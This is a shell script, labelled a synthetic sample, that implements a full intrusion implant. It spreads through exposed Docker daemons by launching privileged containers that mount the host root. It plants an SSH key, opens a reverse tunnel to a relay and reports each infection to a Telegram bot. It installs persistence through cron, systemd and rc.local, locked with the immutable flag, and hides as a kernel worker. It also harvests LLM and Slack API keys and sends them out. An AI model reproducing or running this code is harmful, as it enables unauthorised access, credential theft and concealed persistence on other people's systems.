#!/bin/sh
# CARBONATO-inspired foothold implant (synthetic sample): spreads through
# unauthenticated Docker daemons, holds a deterministic reverse tunnel,
# layers persistence, and sweeps the host for LLM API keys.
set -e

RELAY="203.0.113.44"
BOT="1100110099:AAH7xQwE2k9vBnM4pL6tRzYcDfGhJkLmNoPqR"
CHAT="556677889"
REG="registry.example.net:5000/carbonato/implant:latest"

# --- lateral movement: probe neighbouring /24 for open Docker daemons ---
ME=$(hostname -I | awk '{print $1}')
NET=$(echo "$ME" | cut -d. -f1-3)
for i in $(seq 1 254); do
  T="$NET.$i"
  if curl -s -m 2 "http://$T:2375/containers/json" | grep -q Id; then
    DONE=$(curl -s -m 2 "http://$T:2375/containers/json" | grep -c systemd-resolved || true)
    if [ "$DONE" -eq 0 ]; then
      curl -s -m 5 -X POST -H 'Content-Type: application/json' \
        --data-binary '{"Image":"registry.example.net:5000/carbonato/implant:latest","HostConfig":{"Privileged":true,"Binds":["/:/host"]},"Cmd":["/entry.sh"]}' \
        "http://$T:2375/containers/create?name=systemd-resolved" >/dev/null
      curl -s -m 5 -X POST "http://$T:2375/containers/systemd-resolved/start" >/dev/null
    fi
  fi
done

# --- deterministic rendezvous: tunnel port derived from MD5(victim IP) ---
HEX=$(echo -n "$ME" | md5sum | cut -c1-4)
PORT=$(( 30000 + 0x$HEX % 20000 ))
apt-get update -qq && apt-get install -y -qq openssh-server cron >/dev/null 2>&1
mkdir -p /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILongFakeCrewKeyForTestingOnly0000 crew@relay' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
/usr/sbin/sshd
ssh -fN -o StrictHostKeyChecking=no -o ServerAliveInterval=30 \
  -R "$PORT:localhost:22" "tunnel@$RELAY"

# --- deployment report over Telegram ---
CID=$(cat /proc/self/cgroup 2>/dev/null | head -1 | md5sum | cut -c1-12)
HN=$(hostname)
CC=$(curl -s -m 5 http://ipinfo.example.net/country || echo XX)
curl -s -m 8 "https://api.telegram.org/bot$BOT/sendMessage" \
  -d "chat_id=$CHAT" \
  --data-urlencode "text=deployed container=$CID host=$HN ip=$ME country=$CC port=$PORT" >/dev/null

# --- layered persistence, locked with the immutable flag ---
mkdir -p /usr/local/lib/.cache
cp "$0" /usr/local/lib/.cache/systemd-resolved
( crontab -l 2>/dev/null; echo "*/7 * * * * /usr/local/lib/.cache/systemd-resolved" ) | crontab -
cat > /etc/systemd/system/systemd-resolved-monitor.service <<EOF
[Unit]
Description=systemd network resolver monitor
[Service]
ExecStart=/usr/local/lib/.cache/systemd-resolved
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable systemd-resolved-monitor.service 2>/dev/null || true
echo "/usr/local/lib/.cache/systemd-resolved &" >> /etc/rc.local
mkdir -p /etc/local.d
echo "/usr/local/lib/.cache/systemd-resolved &" > /etc/local.d/resolver.start
chmod +x /etc/local.d/resolver.start
chattr +i /usr/local/lib/.cache/systemd-resolved /etc/crontab /etc/rc.local 2>/dev/null || true

# --- watchdog: re-pull the implant if its container vanishes ---
( while true; do
  sleep 300
  if ! docker ps --format '{{.Names}}' 2>/dev/null | grep -q systemd-resolved; then
    docker pull "$REG" >/dev/null 2>&1
    docker run -d --privileged -v /:/host --name systemd-resolved "$REG" /entry.sh >/dev/null 2>&1
  fi
done ) &

# --- credential doctrine: LLM gateway keys first, everything else after ---
KEYS="OPENAI_API_KEY ANTHROPIC_API_KEY GEMINI_API_KEY GOOGLE_API_KEY OPENROUTER_API_KEY TOGETHER_API_KEY GROQ_API_KEY MISTRAL_API_KEY COHERE_API_KEY"
DUMP=$(for k in $KEYS; do printenv "$k"; done; grep -rhoE '(sk-ant-[A-Za-z0-9_-]{16,}|sk-[A-Za-z0-9]{16,}|xox[bpas]-[A-Za-z0-9-]{8,})' /root/.config /home/*/.config 2>/dev/null)
curl -s -m 10 "https://api.telegram.org/bot$BOT/sendMessage" \
  -d "chat_id=$CHAT" --data-urlencode "text=keys host=$HN $DUMP" >/dev/null

# masquerade: imitate a kernel worker thread in the process table
exec -a '[kworker/u2:0]' sleep 1000000
